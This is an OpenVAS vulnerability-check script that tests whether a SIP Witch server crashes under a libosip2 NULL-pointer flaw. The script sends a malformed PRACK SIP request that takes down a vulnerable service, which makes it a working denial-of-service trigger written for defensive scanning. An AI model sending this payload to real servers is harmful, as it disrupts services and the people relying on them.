###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sip_witch_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# SIP Witch Denial Of Service Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attacker to cause denial of
  service resulting in a loss of availability.
  Impact Level: Application";

tag_affected = "SIP Witch 0.7.4 with libosip2-4.0.0";
tag_insight = "Flaw is due to NULL pointer dereference in osip_lost.c of libosip2 library.";
tag_solution = "No solution or patch is available as of 29th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to www.gnu.org/software/sipwitch";
tag_summary = "This host is installed with SIP Witch and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(803457);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-29 15:06:28 +0530 (Fri, 29 Mar 2013)");
  script_name("SIP Witch Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/90920");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Mar/60");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525904/30/90/threaded");
  script_summary("Check if SIP Witch is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("sip_detection.nasl");
  script_require_ports("Services/udp/sip");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("sip.inc");

## Variable Initialization
port = "";
banner = "";
bad_request = "";
prop_request = "";

## Get the SIP port
port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;

## Construct the proper request to get banner
prop_request = string(
        "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
        "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
        "Max-Forwards: 70\r\n",
        "To: <sip:", this_host(), ":", port, ">\r\n",
        "From: OpenVAS <sip:", this_host(), ":", port, ">\r\n",
        "Call-ID: ", rand(), "\r\n",
        "CSeq: 63104 OPTIONS\r\n",
        "Contact: <sip:", this_host(), ">\r\n",
        "Accept: application/sdp\r\n",
        "Content-Length: 0\r\n\r\n");

## Construct the bad request
bad_request = string(
    "PRACK sip:1 ()\r\n",
    "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
    "Call-ID: ", "a", "\r\n");

## Get the banner and confirm the application
banner = sip_send_recv(port:port, data:prop_request);
if ("sipwitch" >!< banner) exit(0);

## Send the bad request
sip_send_recv(port:port, data:bad_request);

sleep(1);

## Confirm the exploit by getting the banner
banner = sip_send_recv(port:port, data:prop_request);
if(!banner)
{
  security_hole(port);
  exit(0);
}
